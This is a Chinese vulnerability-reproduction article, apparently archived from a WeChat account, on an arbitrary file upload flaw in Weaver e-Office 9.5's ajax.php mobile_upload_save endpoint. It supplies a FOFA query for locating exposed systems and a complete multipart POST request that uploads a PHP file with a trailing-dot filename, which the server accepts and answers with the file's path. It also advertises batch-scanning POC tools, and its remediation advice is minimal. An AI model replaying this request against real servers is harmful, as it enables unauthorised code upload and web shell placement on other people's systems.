---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  泛微e-office系统ajax.php接口存在任意文件上传漏洞   
南风漏洞复现文库  南风漏洞复现文库   2024-04-17 23:31  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 泛微e-office系统ajax.php接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。  
## 2.漏洞描述  
  
泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件。泛微 E-Office 9.5版本存在代码问题漏洞，泛微e-office系统ajax.php接口存在任意文件上传漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
泛微 E-Office 9.5版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOzB6BmSEjMqtQRgiaHQxPxrRqOiaSj5ibXhaE82icwNCQJx7txyDdiaqwGvg/640?wx_fmt=jpeg&from=appmsg "null")  
  
泛微e-office系统ajax.php接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="泛微-EOffice"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  
  
漏洞数据包：  
```
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
Content-Type: multipart/form-data; boundary=c2307d1cd1165cfacd8cd7c008f44d1e
Cookie: testBanCookie=test; ecology_JSessionId=abcLQ67J8J80DciAxUz5y; JSESSIONID=abcLQ67J8J80DciAxUz5y; ecology_JSessionid=abcLQ67J8J80DciAxUz5y
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Host: 127.0.0.1
Content-Length: 334
Expect: 100-continue
Connection: close

--c2307d1cd1165cfacd8cd7c008f44d1e
Content-Disposition: form-data; name="upload_quwan"; filename="HGsrz.php."
Content-Type: image/jpeg

<?php phpinfo();?>
--c2307d1cd1165cfacd8cd7c008f44d1e
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream


--c2307d1cd1165cfacd8cd7c008f44d1e--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOib2p2kNNXvoO9vmlsyuBu3A79dbOPtUicRVD4ic4ibibqsORFf2tK1rAA7A/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传成功会返回路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOC4n3sklvotp9kYj6TkibwHpaQic6x4ZibayEicRHAoNrhAq5QXD1uZxe4Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOl8iatZwtTRK03GichEH859BpMQQwHKxK9WYlPdAHVTLXpLU0wiapfHe9A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOxCz9YJ6Hx20g9DSCyM2zZ17uK2WuO5T8v6SI88cEGyw0AUXJGkTX6g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAO69xDicD33jShDrqEzEWf2Zw44fJBxW6BhrX2V06eEbiafBr2oScMooDg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOWETSnEbYjyjFzgpS1ERXSl20rG3A9jgxKkx0Hlsyd1U9lqVnITwmwA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3ZVQNoEKerHnTW1DfA7jkAOsLVxRNdae2ufX4IAYMBhBxTuiaGKQ0SvYdIECq0Ez1CeXWymdJSSPQA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注官网更新补丁: https://www.e-office.cn/  
## 8.往期回顾  
  
[魔方网表mailupdate.jsp接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486185&idx=1&sn=1e454d13e5415d343d126acc74b85954&chksm=974b87eea03c0ef841b66c87ea913d064f5a4b490c58b1f37794b9464070a744df5c0e551266&scene=21#wechat_redirect)  
  
  
[浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486163&idx=1&sn=be62990ea16076d51fba74099ada6664&chksm=974b87d4a03c0ec25569a4fe6371b5762a9974bd3ffc75871c8a8641d676354a0b4f3b1d8d83&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
